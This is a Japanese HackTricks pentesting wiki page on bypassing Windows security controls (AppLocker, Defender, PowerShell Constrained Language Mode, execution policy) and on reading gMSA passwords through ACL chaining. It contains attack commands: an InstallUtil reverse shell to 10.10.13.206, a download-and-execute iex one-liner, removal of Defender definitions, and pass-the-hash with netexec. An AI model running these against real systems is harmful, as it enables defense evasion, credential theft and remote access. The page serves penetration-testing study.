# Windows セキュリティ コントロール

{{#include ../../banners/hacktricks-training.md}}

## AppLocker ポリシー

アプリケーションホワイトリストは、システム上に存在し実行が許可される承認済みソフトウェアや実行ファイルの一覧です。目的は、組織の特定の業務要件に合致しない有害なマルウェアや未承認ソフトウェアから環境を保護することです。

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) は Microsoft の **アプリケーションホワイトリスティングソリューション** で、システム管理者に **ユーザーが実行できるアプリケーションおよびファイルを制御する** 権限を提供します。実行ファイル、スクリプト、Windows インストーラー ファイル、DLL、パッケージ化されたアプリ、およびパッケージインストーラーに対して **詳細な制御** を提供します。\
多くの組織では **cmd.exe と PowerShell.exe をブロック** したり特定のディレクトリへの書き込みアクセスを制限することが一般的ですが、**これはすべて回避可能です**。

### チェック

どのファイル/拡張子がブラックリスト/ホワイトリストに登録されているか確認する：
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
このレジストリパスには AppLocker によって適用される設定とポリシーが含まれており、システム上で強制されている現在のルールのセットを確認する方法を提供します:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy を bypass するのに有用な **Writable folders**: AppLocker が `C:\Windows\System32` または `C:\Windows` の中で任意の実行を許可している場合、これを **bypass** するために使用できる **writable folders** が存在します。
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- 一般的に**信頼されている** [**"LOLBAS's"**](https://lolbas-project.github.io/) バイナリは AppLocker を回避するのにも有用です。
- **不適切に作成されたルールはバイパスされる可能性があります**
- 例えば、**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** のようなルールでは、どこにでも **`allowed` というフォルダを作成**すれば許可されてしまいます。
- 組織はしばしば **`%System32%\WindowsPowerShell\v1.0\powershell.exe` 実行ファイルのブロック** に注力しますが、`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` や `PowerShell_ISE.exe` といった他の [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) を忘れがちです。
- **DLL enforcement は、システムに与える追加負荷や動作確認のためのテスト量のため、ほとんど有効化されません。** したがって、**DLL をバックドアとして利用することは AppLocker のバイパスに役立ちます**。
- [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) や [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) を使用すると、任意のプロセス内で PowerShell コードを実行して AppLocker をバイパスできます。詳細は次を参照してください: https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode

## 資格情報の保存

### Security Accounts Manager (SAM)

ローカルの資格情報はこのファイルに存在し、パスワードはハッシュ化されています。

### Local Security Authority (LSA) - LSASS

**資格情報**（ハッシュ化されたもの）は、Single Sign-On のためにこのサブシステムの**メモリ**に**保存**されます。\
**LSA** はローカルの **セキュリティポリシー**（パスワードポリシー、ユーザー権限...）、**認証**、**アクセストークン**などを管理します。\
LSA はローカルログイン時には **SAM** ファイル内の提供された資格情報を**確認**し、ドメインユーザーを認証するために **ドメインコントローラー** と**連携**します。

**資格情報**は**LSASS プロセス**内に**保存**されます: Kerberos チケット、NT と LM のハッシュ、容易に復号できるパスワードなど。

### LSA secrets

LSA はディスク上にいくつかの資格情報を保存する場合があります:

- Active Directory のコンピュータアカウントのパスワード（ドメインコントローラーに到達できない場合のため）。
- Windows サービスのアカウントのパスワード
- スケジュールされたタスクのパスワード
- その他（IIS アプリケーションのパスワードなど）

### NTDS.dit

これは Active Directory のデータベースです。ドメインコントローラーにのみ存在します。

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) は Windows 10 および Windows 11、並びに Windows Server のバージョンで利用可能なアンチウイルスです。`WinPEAS` のような一般的な pentesting ツールを**ブロック**します。しかし、これらの防御を**回避する**方法も存在します。

### チェック

Defender の**状態**を確認するには、PS コマンドレット **`Get-MpComputerStatus`** を実行します（有効かどうかは **`RealTimeProtectionEnabled`** の値を確認してください）:

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

列挙するには、次のコマンドも実行できます:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS は暗号化を用いてファイルを保護します。対称鍵として知られる **File Encryption Key (FEK)** を使用し、この鍵はユーザーの **public key** で暗号化され、暗号化ファイルの $EFS **alternative data stream** に格納されます。復号が必要な際には、ユーザーのデジタル証明書に対応する **private key** を使用して $EFS ストリームから FEK を復号します。詳細は [here](https://en.wikipedia.org/wiki/Encrypting_File_System) を参照してください。

**ユーザーの操作なしでの復号シナリオ** には以下が含まれます：

- ファイルやフォルダが FAT32 のような非 EFS ファイルシステムに移動されると、自動的に復号されます。
- SMB/CIFS プロトコルでネットワーク越しに送信される暗号化ファイルは、送信前に復号されます。

この暗号化方式は所有者に対して暗号化ファイルへの **透過的なアクセス** を許します。ただし、所有者のパスワードを単に変更してログインするだけでは復号はできません。

**重要ポイント**:

- EFS は対称 FEK を使用し、それがユーザーの public key で暗号化される。
- 復号はユーザーの private key を用いて FEK にアクセスすることで行われる。
- FAT32 へのコピーやネットワーク送信など、特定の条件下で自動復号が発生する。
- 暗号化ファイルは所有者が追加の手順なしにアクセス可能である。

### Check EFS info

このサービスを **ユーザー** が **使用した** かどうかは次のパスが存在するか確認して調べます: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

ファイルへの **誰がアクセスできるか** は `cipher /c \<file>\` を使って確認できます。フォルダ内で `cipher /e` と `cipher /d` を使えば、フォルダ内のすべてのファイルを **暗号化** / **復号** できます。

### Decrypting EFS files

#### Being Authority System

この方法は **被害ユーザー** がホスト内で **プロセス** を **実行している** 必要があります。もしそうなら、`meterpreter` セッションを使用してユーザーのプロセスのトークンを偽装する（`impersonate_token` from `incognito`）ことができます。または単にユーザーのプロセスに `migrate` することも可能です。

#### Knowing the users password


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft は IT インフラ内のサービスアカウント管理を簡素化するために **Group Managed Service Accounts (gMSA)** を開発しました。従来のサービスアカウントではしばしば "**Password never expire**" 設定が有効になっていることがありますが、gMSA はより安全で管理しやすいソリューションを提供します：

- **自動パスワード管理**: gMSA は複雑な 240 文字のパスワードを使用し、ドメインまたはコンピュータのポリシーに従って自動的に変更されます。このプロセスは Microsoft の Key Distribution Service (KDC) によって処理され、手動でのパスワード更新の必要がなくなります。
- **強化されたセキュリティ**: これらのアカウントはロックアウトの対象にならず、対話型ログインに使用できないためセキュリティが向上します。
- **複数ホスト対応**: gMSA は複数のホストで共有可能であり、複数サーバーで実行されるサービスに適しています。
- **スケジュールタスク対応**: managed service accounts と異なり、gMSA はスケジュールタスクの実行をサポートします。
- **SPN 管理の簡素化**: コンピュータの sAMAccount 情報や DNS 名に変更があった場合、システムが自動的に Service Principal Name (SPN) を更新し、SPN 管理を簡素化します。

gMSA のパスワードは LDAP プロパティ _**msDS-ManagedPassword**_ に保存され、Domain Controllers (DCs) によって 30 日ごとに自動的にリセットされます。このパスワードは [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) として知られる暗号化データの塊であり、許可された管理者と gMSA がインストールされているサーバーのみが取得可能で、セキュアな環境を保証します。これらの情報にアクセスするには LDAPS のようなセキュアな接続が必要であるか、接続が 'Sealing & Secure' で認証されている必要があります。

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

You can read this password with [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**詳細はこの投稿を参照**](https://cube0x0.github.io/Relaying-for-gMSA/)

また、この [web page](https://cube0x0.github.io/Relaying-for-gMSA/) では、**NTLM relay attack** を実行して **gMSA** の **password** を **read** する方法が解説されています。

### ACL chaining を悪用して gMSA 管理パスワードを読み取る (GenericAll -> ReadGMSAPassword)

多くの環境では、低特権ユーザーが誤設定されたオブジェクト ACL を悪用することで、DC を侵害せずに gMSA のシークレットに pivot できます:

- あなたが制御できるグループ（例: GenericAll/GenericWrite により）が gMSA に対して `ReadGMSAPassword` を付与されている。
- そのグループに自分を追加することで、LDAP 経由で gMSA の `msDS-ManagedPassword` ブロブを読み取る権限を継承し、使用可能な NTLM 資格情報を導出できます。

Typical workflow:

1) BloodHound を使ってパスを発見し、foothold principals を Owned としてマークします。以下のようなエッジを探してください:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) 自分が制御している中間グループに自分を追加します（bloodyAD の例）:
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) LDAPを通じてgMSAの管理パスワードを読み取り、NTLMハッシュを導出します。NetExecは`msDS-ManagedPassword`の抽出とNTLMへの変換を自動化します:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) NTLMハッシュを使ってgMSAとして認証します（平文は不要）。アカウントが Remote Management Users にある場合、WinRM は直接動作します：
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
メモ:
- `msDS-ManagedPassword` の LDAP 読み取りはシーリング（例: LDAPS/sign+seal）が必要です。ツールがこれを自動的に処理します。
- gMSAs はしばしば WinRM のようなローカル権利を付与されます。lateral movement を計画するため、グループメンバーシップ（例: Remote Management Users）を検証してください。
- NTLM を自分で計算するために blob のみが必要な場合は、MSDS-MANAGEDPASSWORD_BLOB 構造を参照してください。



## LAPS

The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), enables the management of local Administrator passwords. これらのパスワードは **ランダム化され**、一意で、**定期的に変更され**、Active Directory に集中して保存されます。これらのパスワードへのアクセスは ACLs によって許可されたユーザーに制限されています。十分な権限が付与されていれば、ローカル管理者のパスワードを読み取ることができます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **多くの機能を制限します**。PowerShell を効果的に使用するために必要な機能（例えば COM objects のブロック、承認された .NET types のみを許可、XAML-based workflows、PowerShell classes など）が制限されます。

### **確認**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
最新の Windows ではその Bypass は動作しませんが、[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) を使用できます。\
**コンパイルするには** **次に** _**Add a Reference**_ -> _Browse_ -> _Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` を追加し、**プロジェクトを .Net4.5 に変更**してください。

#### 直接的な Bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass the constrained mode. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## PS 実行ポリシー

デフォルトでは **restricted.** に設定されています。 このポリシーをバイパスする主な方法：
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
詳細は[here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)にあります。

## セキュリティ サポート プロバイダ インターフェイス (SSPI)

ユーザーを認証するために使用できるAPIです。

SSPIは、通信しようとする2台のマシンにとって適切なプロトコルを見つける役割を担います。好まれる方法はKerberosです。SSPIはどの認証プロトコルを使用するかをネゴシエートします。これらの認証プロトコルはSecurity Support Provider (SSP)と呼ばれ、各Windowsマシン内にDLLの形で存在し、通信するには両方のマシンが同じものをサポートしている必要があります。

### 主なSSP

- **Kerberos**: 推奨されるプロトコル
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: 互換性のため
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: WebサーバーとLDAPで使用、パスワードはMD5ハッシュの形式
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSLおよびTLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: 使用するプロトコルをネゴシエートするために使用（KerberosまたはNTLM、デフォルトはKerberos）
- %windir%\Windows\System32\lsasrv.dll

#### ネゴシエーションは複数の方法を提示する場合もあれば、1つだけの場合もあります。

## UAC - ユーザー アカウント制御

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、**昇格された操作に対する同意プロンプトを有効にする**機能です。


{{#ref}}
uac-user-account-control.md
{{#endref}}

## 参考

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
